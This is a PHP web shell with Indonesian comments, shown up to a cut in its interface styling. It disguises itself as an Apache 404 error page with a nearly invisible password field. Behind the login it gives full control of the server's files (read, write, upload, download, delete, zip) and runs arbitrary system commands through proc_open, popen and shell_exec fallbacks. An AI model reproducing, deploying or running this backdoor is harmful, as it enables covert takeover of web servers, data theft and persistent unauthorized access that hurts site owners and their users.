<?php
error_reporting(0);

// ================ HIDDEN LOGIN SYSTEM ===============
session_start();

$valid_hash = '$2y$10$wg9lRJsLZgU0Dk0BRMowU.87PjIOMQiDSKNfHF3YcPFNabEPlF/Fm';

// Cek apakah sudah login
if (!isset($_SESSION['sigma_access'])) {
    // Cek form login
    if (isset($_POST['sigma_pass'])) {
        if (password_verify($_POST['sigma_pass'], $valid_hash)) {
            $_SESSION['sigma_access'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
    }
    
    // Tampilkan halaman 404 palsu dengan form login
    http_response_code(404);
    $requested_url = $_SERVER['REQUEST_URI'] ?? '/';
    ?>
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html>
    <head>
        <title>404 Not Found</title>
        <style>
            /* Hidden password form - samar di tengah bawah */
            .sigma-form {
                position: fixed;
                bottom: 20px;
                left: 50%;
                transform: translateX(-50%);
                opacity: 0.15;
                transition: opacity 0.3s ease;
                text-align: center;
                pointer-events: auto;
                z-index: 1000;
            }
            .sigma-form:hover { opacity: 0.4; }
            .sigma-form input {
                background: transparent;
                border: 1px solid #ccc;
                color: #333;
                padding: 6px 12px;
                font-size: 13px;
                font-family: 'Times New Roman', serif;
                width: 150px;
                border-radius: 0;
            }
            .sigma-form input:focus {
                outline: none;
                border-color: #666;
                background: rgba(255,255,255,0.1);
            }
            .sigma-form button {
                background: transparent;
                border: 1px solid #ccc;
                color: #333;
                padding: 6px 12px;
                font-size: 13px;
                font-family: 'Times New Roman', serif;
                cursor: pointer;
                margin-left: 5px;
            }
            .sigma-form button:hover { background: rgba(0,0,0,0.05); }
            .error-msg {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: rgba(255,0,0,0.1);
                border: 1px solid #ff0000;
                color: #ff0000;
                padding: 5px 10px;
                font-size: 12px;
                font-family: monospace;
                opacity: 0.7;
            }
        </style>
    </head>
    <body>
        <h1>Not Found</h1>
        <p>The requested URL <?php echo htmlspecialchars($requested_url); ?> was not found on this server.</p>
        <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
        
        <!-- access pattern: /dev/shm/.sigma -->
        
        <!-- Hidden login form - samar di tengah bawah -->
        <form method="POST" class="sigma-form" autocomplete="off">
            <input type="password" name="sigma_pass" placeholder="••••••">
            <button type="submit">→</button>
        </form>
        
        <?php if (isset($_POST['sigma_pass'])): ?>
            <div class="error-msg">Access denied</div>
        <?php endif; ?>
        
        <script>
        (function() {
            const form = document.querySelector('.sigma-form');
            const input = form.querySelector('input');
            input.addEventListener('focus', function() { form.style.opacity = '0.8'; });
            input.addEventListener('blur', function() { form.style.opacity = '0.15'; });
        })();
        </script>
    </body>
    </html>
    <?php
    exit; // PENTING: Hentikan eksekusi jika belum login
}
// ================ END LOGIN SYSTEM ================

// Catch fatal error biar response tetep JSON valid
register_shutdown_function(function() {
    $err = error_get_last();
    if ($err && in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR], true)) {
        while (ob_get_level()) ob_end_clean();
        if (!headers_sent()) header('Content-Type: application/json');
        echo json_encode(['ok' => false, 'msg' => 'PHP FATAL: ' . $err['message'] . ' @ ' . basename($err['file']) . ':' . $err['line']]);
    }
});

define('IS_WINDOWS', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

function fix_path($p) { return str_replace('\\', '/', (string)$p); }
function clean_path($p) {
    $p = fix_path($p);
    if ($p === '' || $p === '/') return '/';
    if (preg_match('#^[A-Za-z]:$#', $p)) return $p . '/';
    if (preg_match('#^[A-Za-z]:/$#', $p)) return $p;
    return rtrim($p, '/');
}
function parent_path($p) {
    if ($p === null || $p === '') return null;
    $p = rtrim(fix_path($p), '/');
    if ($p === '') return null;
    if (preg_match('#^[A-Za-z]:$#', $p)) return '/';
    $parent = preg_replace('#/[^/]+$#', '', $p);
    if ($parent === '' || $parent === null) return '/';
    if (preg_match('#^[A-Za-z]:$#', $parent)) return $parent . '/';
    return $parent;
}
function is_windows_virtual_root($p) {
    if (!IS_WINDOWS) return false;
    $p = fix_path($p);
    return ($p === '/' || $p === '' || $p === '.');
}
function sanitize_utf8($s) {
    $s = str_replace("\x00", '', (string)$s);
    if (function_exists('mb_check_encoding') && !mb_check_encoding($s, 'UTF-8')) {
        $s = mb_convert_encoding($s, 'UTF-8', 'UTF-8');
    }
    return $s;
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = clean_path($path);
if (!is_windows_virtual_root($path) && !is_dir($path)) $path = clean_path(getcwd());

// Session cwd sudah ada dari atas
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = is_windows_virtual_root($path) ? clean_path(getcwd()) : $path;
}

if (isset($_GET['download'])) {
    $target = $_GET['download'];
    if (is_file($target)) {
        header('Content-Type: application/octet-stream');
        header('Content-Length: ' . filesize($target));
        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
        readfile($target);
        exit;
    }
    if (is_dir($target) && class_exists('ZipArchive')) {
        $tmp = tempnam(sys_get_temp_dir(), 'dl_') . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            $base = rtrim($target, '/\\');
            $baseName = basename($base);
            $zip->addEmptyDir($baseName);
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($base, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($it as $f) {
                $rel = $baseName . '/' . substr(fix_path($f->getPathname()), strlen(fix_path($base)) + 1);
                if ($f->isDir()) $zip->addEmptyDir($rel);
                else             $zip->addFile($f->getPathname(), $rel);
            }
            $zip->close();
            header('Content-Type: application/zip');
            header('Content-Length: ' . filesize($tmp));
            header('Content-Disposition: attachment; filename="' . $baseName . '.zip"');
            readfile($tmp);
            @unlink($tmp);
            exit;
        }
        @unlink($tmp);
    }
    header('HTTP/1.0 400 Bad Request');
    exit('Download not supported');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $res = ['ok' => false, 'msg' => ''];

    switch ($_POST['action']) {
        case 'save':
            $target = fix_path($_POST['file'] ?? '');
            if ($target && (is_file($target) || !file_exists($target))) {
                $ok = @file_put_contents($target, $_POST['content'] ?? '');
                $res = $ok !== false ? ['ok' => true, 'msg' => 'SAVED: ' . basename($target)]
                                     : ['ok' => false, 'msg' => 'SAVE FAILED'];
            } else $res['msg'] = 'INVALID TARGET';
            break;

        case 'rename':
            $old = fix_path($_POST['oldname'] ?? '');
            $newName = trim($_POST['newname'] ?? '');
            if ($old && $newName !== '') {
                $new = dirname($old) . '/' . basename($newName);
                if (file_exists($old) && !file_exists($new)) {
                    $res = @rename($old, $new) ? ['ok' => true, 'msg' => 'RENAMED: ' . basename($newName)]
                                               : ['ok' => false, 'msg' => 'RENAME FAILED'];
                } else $res['msg'] = 'RENAME ERROR';
            } else $res['msg'] = 'RENAME: INVALID NAME';
            break;

        case 'delete':
            $targets = $_POST['targets'] ?? ($_POST['delete'] ?? '');
            if (is_string($targets)) $targets = [$targets];
            $okCount = 0;
            foreach ($targets as $target) {
                $target = fix_path($target);
                if (!$target || !file_exists($target)) continue;
                if (is_file($target)) { if (@unlink($target)) $okCount++; }
                elseif (is_dir($target)) { if (recurse_delete($target)) $okCount++; }
            }
            $res = $okCount > 0 ? ['ok' => true, 'msg' => "DELETED: $okCount item(s)"]
                                : ['ok' => false, 'msg' => 'DELETE FAILED'];
            break;

        case 'list':
            $p = clean_path($_POST['path'] ?? $path);
            if (is_windows_virtual_root($p)) {
                $res = ['ok' => true, 'path' => '/', 'entries' => []];
                for ($i = ord('A'); $i <= ord('Z'); $i++) {
                    $letter = chr($i);
                    $drive = $letter . ':/';
                    if (@is_dir($drive)) {
                        $res['entries'][] = ['name' => $letter . ':', 'path' => $drive,
                            'dir' => true, 'drive' => true, 'size' => 0, 'mtime' => 0];
                    }
                }
                break;
            }
            if (!is_dir($p)) { $res['msg'] = 'INVALID DIR: ' . $p; break; }
            $_SESSION['cwd'] = $p;
            $res = ['ok' => true, 'path' => $p, 'entries' => []];
            $items = array_values(array_diff(scandir($p), ['.', '..']));
            usort($items, function ($a, $b) use ($p) {
                $aD = is_dir("$p/$a"); $bD = is_dir("$p/$b");
                if ($aD !== $bD) return $aD ? -1 : 1;
                return strcasecmp($a, $b);
            });
            foreach ($items as $f) {
                $full = "$p/$f";
                $res['entries'][] = ['name' => $f, 'path' => $full, 'dir' => is_dir($full),
                    'drive' => false, 'size' => is_file($full) ? filesize($full) : 0,
                    'mtime' => @filemtime($full) ?: 0];
            }
            break;

        case 'read':
            $f = fix_path($_POST['file'] ?? '');
            if (is_file($f)) $res = ['ok' => true, 'path' => $f, 'content' => file_get_contents($f)];
            else $res['msg'] = 'NOT A FILE';
            break;

        case 'info':
            $t = fix_path($_POST['target'] ?? '');
            if (!file_exists($t)) { $res['msg'] = 'NOT FOUND'; break; }
            $isDir = is_dir($t);
            $owner = fileowner($t); $group = filegroup($t);
            if (function_exists('posix_getpwuid')) { $o = @posix_getpwuid($owner); if ($o) $owner = $o['name']; }
            if (function_exists('posix_getgrgid')) { $g = @posix_getgrgid($group); if ($g) $group = $g['name']; }
            $res = ['ok' => true, 'info' => [
                'name' => basename($t), 'path' => $t, 'type' => $isDir ? 'DIR' : 'FILE',
                'size' => $isDir ? '-' : filesize($t),
                'readable' => is_readable($t) ? 'yes' : 'no',
                'writable' => is_writable($t) ? 'yes' : 'no',
                'perm' => substr(sprintf('%o', fileperms($t)), -4),
                'owner' => $owner, 'group' => $group,
                'mtime' => date('Y-m-d H:i:s', filemtime($t)),
                'atime' => date('Y-m-d H:i:s', fileatime($t)),
                'ctime' => date('Y-m-d H:i:s', filectime($t)),
                'ext' => $isDir ? '-' : (pathinfo($t, PATHINFO_EXTENSION) ?: '-'),
            ]];
            break;

        case 'newfile':
            $name = trim($_POST['name'] ?? '');
            if ($name === '') { $res['msg'] = 'EMPTY NAME'; break; }
            $base = $_SESSION['cwd'] ?? $path;
            if (is_windows_virtual_root($base)) $base = clean_path(getcwd());
            $target = rtrim($base, '/') . '/' . basename($name);
            if (file_exists($target)) { $res['msg'] = 'ALREADY EXISTS'; break; }
            $ok = @file_put_contents($target, '') !== false;
            $res = $ok ? ['ok' => true, 'msg' => 'CREATED: ' . basename($name)]
                       : ['ok' => false, 'msg' => 'CREATE FAILED'];
            break;

        case 'newfolder':
            $name = trim($_POST['name'] ?? '');
            if ($name === '') { $res['msg'] = 'EMPTY NAME'; break; }
            $base = $_SESSION['cwd'] ?? $path;
            if (is_windows_virtual_root($base)) $base = clean_path(getcwd());
            $target = rtrim($base, '/') . '/' . basename($name);
            if (file_exists($target)) { $res['msg'] = 'ALREADY EXISTS'; break; }
            $ok = @mkdir($target, 0755);
            $res = $ok ? ['ok' => true, 'msg' => 'CREATED DIR: ' . basename($name)]
                       : ['ok' => false, 'msg' => 'MKDIR FAILED'];
            break;

        case 'upload':
            if (empty($_FILES['files'])) { $res['msg'] = 'NO FILE UPLOADED'; break; }
            $base = $_SESSION['cwd'] ?? $path;
            if (is_windows_virtual_root($base)) $base = clean_path(getcwd());
            $files = $_FILES['files'];
            $names = is_array($files['name']) ? $files['name'] : [$files['name']];
            $tmps  = is_array($files['tmp_name']) ? $files['tmp_name'] : [$files['tmp_name']];
            $errs  = is_array($files['error']) ? $files['error'] : [$files['error']];
            $okCount = 0; $errList = [];
            for ($i = 0; $i < count($names); $i++) {
                $n = basename($names[$i]);
                if ($errs[$i] !== UPLOAD_ERR_OK) { $errList[] = 'err:' . $n; continue; }
                $target = windows_uniq_name($base, $n);
                if (@move_uploaded_file($tmps[$i], $target)) $okCount++;
                else $errList[] = 'move:' . $n;
            }
            $res = $okCount > 0
                ? ['ok' => true,  'msg' => 'UPLOADED: ' . $okCount . ' file(s)']
                : ['ok' => false, 'msg' => 'UPLOAD FAILED: ' . implode('; ', array_slice($errList, 0, 3))];
            break;

        case 'zip':
            $targets = $_POST['targets'] ?? [];
            if (is_string($targets)) $targets = [$targets];
            $targets = array_map('fix_path', $targets);
            if (empty($targets)) { $res['msg'] = 'NO TARGET'; break; }
            if (!class_exists('ZipArchive')) { $res['msg'] = 'ZIP EXT NOT AVAILABLE'; break; }
            $base = $_SESSION['cwd'] ?? $path;
            if (is_windows_virtual_root($base)) $base = clean_path(getcwd());
            $zipName = count($targets) === 1 ? basename($targets[0]) . '.zip' : 'archive_' . date('Ymd_His') . '.zip';
            $zipPath = rtrim($base, '/') . '/' . $zipName;
            if (file_exists($zipPath)) { $res['msg'] = 'ZIP ALREADY EXISTS'; break; }
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE) !== true) { $res['msg'] = 'CANNOT CREATE ZIP'; break; }
            foreach ($targets as $target) {
                if (!file_exists($target)) continue;
                $baseName = basename($target);
                if (is_file($target)) $zip->addFile($target, $baseName);
                else {
                    $zip->addEmptyDir($baseName);
                    $it = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    foreach ($it as $f) {
                        $rel = $baseName . '/' . substr(fix_path($f->getPathname()), strlen(fix_path($target)) + 1);
                        if ($f->isDir()) $zip->addEmptyDir($rel);
                        else             $zip->addFile($f->getPathname(), $rel);
                    }
                }
            }
            $zip->close();
            $res = ['ok' => true, 'msg' => 'ZIPPED: ' . $zipName];
            break;

        case 'unzip':
            $target = fix_path($_POST['target'] ?? '');
            if (!is_file($target)) { $res['msg'] = 'NOT A FILE'; break; }
            if (!class_exists('ZipArchive')) { $res['msg'] = 'ZIP EXT NOT AVAILABLE'; break; }
            $zip = new ZipArchive();
            if ($zip->open($target) !== true) { $res['msg'] = 'CANNOT OPEN ZIP'; break; }
            $dest = dirname($target) . '/' . pathinfo($target, PATHINFO_FILENAME);
            if (!is_dir($dest)) @mkdir($dest, 0755);
            $ok = $zip->extractTo($dest);
            $zip->close();
            $res = $ok ? ['ok' => true, 'msg' => 'UNZIPPED → ' . basename($dest)]
                       : ['ok' => false, 'msg' => 'UNZIP FAILED'];
            break;

        case 'paste':
            $sources = $_POST['sources'] ?? [];
            if (is_string($sources)) $sources = [$sources];
            $sources = array_map('fix_path', $sources);
            $mode = $_POST['mode'] ?? 'copy';
            $destDir = clean_path($_POST['dest'] ?? ($_SESSION['cwd'] ?? $path));
            if (is_windows_virtual_root($destDir) || !is_dir($destDir)) { $res['msg'] = 'DEST NOT A DIR'; break; }
            if (empty($sources)) { $res['msg'] = 'NO SOURCE'; break; }
            $done = 0; $errors = [];
            foreach ($sources as $src) {
                if (!file_exists($src)) { $errors[] = 'missing:' . basename($src); continue; }
                $srcReal = @realpath($src); $destReal = @realpath($destDir);
                if ($srcReal === false || $destReal === false) { $errors[] = 'realpath'; continue; }
                if (strcasecmp(fix_path($srcReal), fix_path($destReal)) === 0) { $errors[] = 'same'; continue; }
                if (is_dir($src)) {
                    $srcR = fix_path($srcReal) . '/'; $dstR = fix_path($destReal) . '/';
                    if (strpos($dstR, $srcR) === 0) { $errors[] = 'recursive'; continue; }
                }
                $target = windows_uniq_name($destDir, basename($src));
                $ok = false;
                if ($mode === 'cut') {
                    $ok = @rename($src, $target);
                    if (!$ok) {
                        if (is_file($src)) { if (@copy($src, $target)) $ok = @unlink($src); }
                        elseif (is_dir($src)) { if (recurse_copy($src, $target)) { recurse_delete($src); $ok = true; } }
                    }
                } else {
                    if (is_file($src)) $ok = @copy($src, $target);
                    elseif (is_dir($src)) $ok = recurse_copy($src, $target);
                }
                if ($ok) $done++; else $errors[] = 'fail:' . basename($src);
            }
            $res = $done > 0 ? ['ok' => true, 'msg' => strtoupper($mode) . ' OK: ' . $done . ' item(s)']
                             : ['ok' => false, 'msg' => 'PASTE FAILED: ' . implode('; ', array_slice($errors, 0, 3))];
            break;

        case 'exec':
            $cmd = trim($_POST['cmd'] ?? '');
            if ($cmd === '') { $res['msg'] = 'EMPTY CMD'; break; }
            $cmd = preg_replace('/^\$\s*/', '', $cmd);
            if ($cmd === '') { $res['msg'] = 'EMPTY CMD'; break; }

            $parts = preg_split('/\s+/', $cmd);
            $first = IS_WINDOWS ? strtolower($parts[0]) : basename($parts[0]);

            if ($first === 'cd') {
                $argIdx = 1;
                if (IS_WINDOWS && isset($parts[1]) && strtolower($parts[1]) === '/d') $argIdx = 2;
                $target = $parts[$argIdx] ?? '~';
                $cwd = $_SESSION['cwd'] ?? $path;
                if (is_windows_virtual_root($cwd)) $cwd = clean_path(getcwd());
                if ($target === '~' || $target === '' || $target === '.') $newCwd = $cwd;
                elseif ($target === '-') $newCwd = $_SESSION['prev_cwd'] ?? $cwd;
                elseif ($target === '..') $newCwd = parent_path($cwd) ?? $cwd;
                else {
                    $target = fix_path($target);
                    $isAbs = false;
                    if (IS_WINDOWS) {
                        if (preg_match('#^[A-Za-z]:#', $target)) {
                            $isAbs = true;
                            if (preg_match('#^[A-Za-z]:$#', $target)) $target .= '/';
                        } elseif (isset($target[0]) && $target[0] === '/') {
                            $drive = substr($cwd, 0, 2);
                            $target = $drive . $target;
                            $isAbs = true;
                        }
                    } else {
                        if (isset($target[0]) && $target[0] === '/') $isAbs = true;
                    }
                    if ($isAbs) $newCwd = $target;
                    else $newCwd = rtrim($cwd, '/') . '/' . $target;
                    $real = @realpath($newCwd);
                    if ($real !== false) $newCwd = fix_path($real);
                }
                $newCwd = clean_path($newCwd);
                if (is_dir($newCwd)) {
                    $_SESSION['prev_cwd'] = $cwd;
                    $_SESSION['cwd'] = $newCwd;
                    $res = ['ok' => true, 'stdout' => '', 'stderr' => '', 'code' => 0,
                            'cmd' => $cmd, 'cwd' => $newCwd, 'changed' => true];
                } else {
                    $res = ['ok' => true, 'stdout' => '', 'stderr' => "cd: $target: No such directory",
                            'code' => 1, 'cmd' => $cmd, 'cwd' => $cwd];
                }
                break;
            }

            $cwd = $_SESSION['cwd'] ?? $path;
            if (is_windows_virtual_root($cwd) || !is_dir($cwd)) $cwd = clean_path(getcwd());

            $stdout = ''; $stderr = ''; $exitCode = 0; $executed = false;

            // 1. Coba proc_open
            if (function_exists('proc_open')) {
                $descriptors = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
                if (IS_WINDOWS) {
                    $cwdNative = str_replace('/', '\\', $cwd);
                    $actualCmd = 'cmd.exe /d /s /c "chcp 65001 >nul 2>&1 & ' . $cmd . '"';
                    $process = @proc_open($actualCmd, $descriptors, $pipes, $cwdNative);
                } else {
                    $process = @proc_open($cmd, $descriptors, $pipes, $cwd);
                }

                if (is_resource($process)) {
                    fclose($pipes[0]);
                    stream_set_blocking($pipes[1], false);
                    stream_set_blocking($pipes[2], false);
                    $start = microtime(true); $timeout = 30.0;
                    while (true) {
                        $status = @proc_get_status($process);
                        $r = [$pipes[1], $pipes[2]]; $w = null; $e = null;
                        $n = @stream_select($r, $w, $e, 0, 200000);
                        if ($n > 0) {
                            foreach ($r as $s) {
                                $chunk = @fread($s, 8192);
                                if ($chunk !== false && $chunk !== '') {
                                    if ($s === $pipes[1]) $stdout .= $chunk;
                                    else                  $stderr .= $chunk;
                                }
                            }
                        }
                        if (!$status || empty($status['running'])) break;
                        if (microtime(true) - $start > $timeout) {
                            @proc_terminate($process);
                            $stderr .= "\n[TIMEOUT after {$timeout}s]";
                            break;
                        }
                    }
                    $stdout .= (string)@stream_get_contents($pipes[1]);
                    $stderr .= (string)@stream_get_contents($pipes[2]);
                    @fclose($pipes[1]); @fclose($pipes[2]);
                    $exitCode = @proc_close($process);
                    $executed = true;
                }
            }

            // 2. Fallback popen
            if (!$executed && function_exists('popen')) {
                $fullCmd = IS_WINDOWS ? 'cmd.exe /d /s /c "' . $cmd . ' 2>&1"' : $cmd . ' 2>&1';
                $fp = @popen($fullCmd, 'r');
                if (is_resource($fp)) {
                    while (!feof($fp)) $stdout .= (string)fread($fp, 8192);
                    $exitCode = @pclose($fp);
                    $executed = true;
                }
            }

            // 3. Fallback shell_exec
            if (!$executed && function_exists('shell_exec')) {
                $fullCmd = IS_WINDOWS ? 'cmd.exe /d /s /c "' . $cmd . ' 2>&1"' : $cmd . ' 2>&1';
                $out = @shell_exec($fullCmd);
                if ($out !== null) { $stdout = $out; $executed = true; }
            }

            if (!$executed) {
                $res = ['ok' => false, 'msg' => 'SEMUA METHOD EXEC GAGAL (proc_open/popen/shell_exec disabled?)'];
                break;
            }

            $stdout = sanitize_utf8($stdout); $stderr = sanitize_utf8($stderr);
            if (strlen($stdout) > 200000) $stdout = substr($stdout, 0, 200000) . "\n...[truncated]";
            if (strlen($stderr) > 50000)  $stderr = substr($stderr, 0, 50000)  . "\n...[truncated]";

            $res = ['ok' => true, 'stdout' => $stdout, 'stderr' => $stderr,
                    'code' => $exitCode, 'cmd' => $cmd, 'cwd' => $cwd];
            break;
    }

    $flags = JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES;
    if (defined('JSON_INVALID_UTF8_SUBSTITUTE')) $flags |= JSON_INVALID_UTF8_SUBSTITUTE;
    $json = json_encode($res, $flags);
    if ($json === false) $json = json_encode(['ok' => false, 'msg' => 'JSON ENCODE ERROR: ' . json_last_error_msg()]);
    echo $json;
    exit;
}

function recurse_copy($src, $dst) {
    if (!is_dir($src)) return false;
    @mkdir($dst, 0755, true);
    $ok = true; $srcF = fix_path($src);
    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($it as $f) {
        $rel = substr(fix_path($f->getPathname()), strlen($srcF) + 1);
        $target = rtrim($dst, '/') . '/' . $rel;
        if ($f->isDir()) @mkdir($target, 0755);
        else             $ok = @copy($f->getPathname(), $target) && $ok;
    }
    return $ok;
}
function recurse_delete($dir) {
    if (!is_dir($dir)) return @unlink($dir);
    $ok = true;
    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($it as $f) {
        if ($f->isDir()) $ok = @rmdir($f->getPathname()) && $ok;
        else             $ok = @unlink($f->getPathname()) && $ok;
    }
    return @rmdir($dir) && $ok;
}
function windows_uniq_name($dir, $name) {
    $dir = rtrim(fix_path($dir), '/');
    $target = $dir . '/' . $name;
    if (!file_exists($target)) return $target;
    $info = pathinfo($name);
    $base = $info['filename'];
    $ext = isset($info['extension']) ? '.' . $info['extension'] : '';
    $i = 2;
    do { $target = $dir . '/' . $base . ' (' . $i . ')' . $ext; $i++; } while (file_exists($target));
    return $target;
}

$safePath = htmlspecialchars($path, ENT_QUOTES);
?>
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="color-scheme" content="light only">
<meta name="theme-color" content="#1e1e2e">
<title>FILE MANAGER</title>
<style>
:root{
  --ink:#191919; --paper:#fff8e8; --panel:#fffdf6;
  --acid:#d7ff3f; --coral:#ff6b5e; --violet:#7c5cff; --sky:#cce6ff;
  --line:3px solid var(--ink);
  --shadow:6px 6px 0 var(--ink);
  --shadow-sm:3px 3px 0 var(--ink);
  color-scheme:light;
}
*{box-sizing:border-box}
html,body{background:var(--paper); color:var(--ink); margin:0;
  font:1rem/1.55 ui-sans-serif,system-ui,-apple-system,sans-serif; min-height:100vh}
@media (prefers-color-scheme: dark){html,body{background:var(--paper); color:var(--ink);}}
a{color:inherit}
button,input,textarea{font:inherit; color:var(--ink)}
button{cursor:pointer}
:focus-visible{outline:4px solid var(--violet); outline-offset:3px}

.item, .item *{-webkit-touch-callout:none; -webkit-user-select:none; user-select:none}
input,textarea,[contenteditable]{-webkit-user-select:text; user-select:text}

.wrap{max-width:1000px; margin:0 auto; padding:1rem}
.btn{display:inline-flex; align-items:center; justify-content:center; gap:.4rem;
  border:var(--line); background:var(--ink); color:var(--paper);
  box-shadow:var(--shadow-sm); padding:.5rem .85rem; font-weight:900;
  text-decoration:none; transition:transform 50ms; white-space:nowrap}
.btn:hover{box-shadow:4px 5px 0 var(--ink); transform:translateY(-2px)}
.btn:active{box-shadow:1px 1px 0 var(--ink); transform:translate(2px,2px)}
.btn.secondary{background:var(--acid); color:#191919}
.btn.coral{background:var(--coral); color:#191919}
.btn.violet{background:var(--violet); color:#fff}
.btn.outline{background:transparent; color:var(--ink)}
.btn.sm{padding:.3rem .55rem; font-size:.78rem}

.pathbar{background:var(--panel); border:var(--line); box-shadow:var(--shadow);
  padding:.6rem .8rem; margin-bottom:1rem;
  display:flex; align-items:center; gap:.4rem;
  overflow-x:auto; overflow-y:hidden; scrollbar-width:none}
.pathbar::-webkit-scrollbar{display:none}
.pathbar .lbl{font-weight:900; opacity:.6; font-size:.8rem; letter-spacing:.05em; text-transform:uppercase; flex-shrink:0}
.crumb{border:2px solid var(--ink); background:var(--paper);
  padding:.15rem .5rem; font-weight:800; font-size:.8rem;
  cursor:pointer; white-space:nowrap; flex-shrink:0; transition:background 80ms}
.crumb:hover{background:var(--acid)}
.crumb.current{background:var(--acid); cursor:default}
.crumb-sep{opacity:.5; flex-shrink:0}

.terminal{background:var(--panel); border:var(--line); box-shadow:var(--shadow);
  margin-bottom:1rem; overflow:hidden}
.terminal-head{background:var(--acid); color:#191919; padding:.5rem .8rem;
  display:flex; align-items:center; gap:.6rem; cursor:pointer;
  -webkit-user-select:none; user-select:none}
.terminal-head .title{font-weight:900; font-size:.8rem; letter-spacing:.08em; text-transform:uppercase; flex-shrink:0}
.terminal-head .cwd{font-family:ui-monospace,monospace; font-size:.7rem; opacity:.7;
  overflow:hidden; text-overflow:ellipsis; white-space:nowrap; flex:1; min-width:0}
.terminal-head .chev{border:3px solid var(--ink); background:var(--ink); color:var(--acid);
  padding:.2rem .4rem; box-shadow:2px 2px 0 var(--ink);
  display:inline-flex; align-items:center; justify-content:center}
.terminal-head .chev svg{transition:transform 220ms ease}
.terminal.collapsed .chev svg{transform:rotate(-90deg)}
.terminal-body{transition:max-height 220ms ease, opacity 160ms ease;
  overflow:hidden; max-height:500px}
.terminal.collapsed .terminal-body{max-height:0; opacity:0}
.terminal-out{background:var(--paper); padding:.8rem;
  font-family:ui-monospace,monospace; font-size:.78rem; line-height:1.6;
  white-space:pre-wrap; word-break:break-all; max-height:300px; overflow-y:auto;
  -webkit-touch-callout:default; -webkit-user-select:text; user-select:text}
.terminal-out::-webkit-scrollbar{width:10px}
.terminal-out::-webkit-scrollbar-track{background:var(--paper)}
.terminal-out::-webkit-scrollbar-thumb{background:var(--ink); border:2px solid var(--paper)}
.tline{display:block; margin-bottom:.15rem}
.tprompt{display:inline-block; background:var(--violet); color:#fff; border:2px solid var(--ink);
  padding:0 .35rem; font-weight:900; margin-right:.4rem}
.tcmd{font-weight:900}
.terr{display:inline-block; background:var(--coral); color:#191919; border:2px solid var(--ink);
  padding:0 .4rem; font-weight:900}
.tcode{display:inline-block; background:var(--violet); color:#fff; border:2px solid var(--ink);
  padding:0 .4rem; font-weight:900}
.tok{color:var(--ink)}
.terminal-input{display:flex; align-items:stretch; border-top:var(--line)}
.terminal-input .ps1{background:var(--violet); color:#fff; font-weight:900;
  padding:.55rem .7rem; display:flex; align-items:center; border-right:var(--line);
  font-family:ui-monospace,monospace; font-size:.85rem}
.terminal-input input{flex:1; border:0; background:transparent;
  padding:.6rem .7rem; font-family:ui-monospace,monospace; font-size:.8rem; outline:none}
.terminal-input input::placeholder{opacity:.4}

.toolbar{background:var(--panel); border:var(--line); box-shadow:var(--shadow);
  padding:.5rem .6rem; margin-bottom:1rem;
  display:flex; gap:.5rem; flex-wrap:wrap; align-items:center}
.toolbar .spacer{flex:1}
.toolbar .selinfo{font-weight:900; font-size:.75rem; opacity:.7}

.notice{border:var(--line); box-shadow:var(--shadow-sm);
  padding:.6rem .8rem; margin-bottom:1rem;
  font-weight:800; font-size:.82rem; text-transform:uppercase}
.notice.ok{background:var(--acid); color:#191919}
.notice.err{background:var(--coral); color:#191919}
.notice.hidden{display:none}

.filelist{list-style:none; padding:0; margin:0; display:flex; flex-direction:column; gap:.6rem}
.item{background:var(--panel); border:var(--line); box-shadow:var(--shadow);
  padding:.5rem .7rem; display:flex; align-items:center; justify-content:space-between;
  gap:.5rem; cursor:pointer; transition:transform 80ms, box-shadow 80ms}
.item:hover{transform:translate(-2px,-2px); box-shadow:8px 8px 0 var(--ink)}
.item.dir{background:var(--acid)}
.item.up{background:var(--sky)}
.item.zip{background:#fff0b8}
.item.drive{background:#c9f0ff}
.item.selected{background:#d8d0ff}
.item.focused{outline:4px solid var(--violet); outline-offset:-4px; background:#d8d0ff; box-shadow:5px 5px 0 var(--violet)}
.item-left{display:flex; align-items:center; gap:.5rem; min-width:0; flex:1}
.item-check{width:20px; height:20px; border:3px solid var(--ink); background:var(--paper);
  flex-shrink:0; cursor:pointer; display:none; align-items:center; justify-content:center}
body.zip-mode .item-check{display:flex}
.item-check.checked{background:var(--violet); color:#fff}
.item-check.checked::after{content:'✓'; font-weight:900; font-size:.85rem}
.item-icon{flex-shrink:0; display:flex; align-items:center}
.item-name{font-family:ui-monospace,monospace; font-weight:900; font-size:.85rem;
  overflow:hidden; text-overflow:ellipsis; white-space:nowrap; min-width:0; cursor:pointer}
.item-size{font-size:.7rem; opacity:.6; flex-shrink:0}
.item-tag{font-size:.65rem; border:2px solid var(--ink);
  padding:.05rem .35rem; font-weight:900; letter-spacing:.05em;
  text-transform:uppercase; flex-shrink:0}
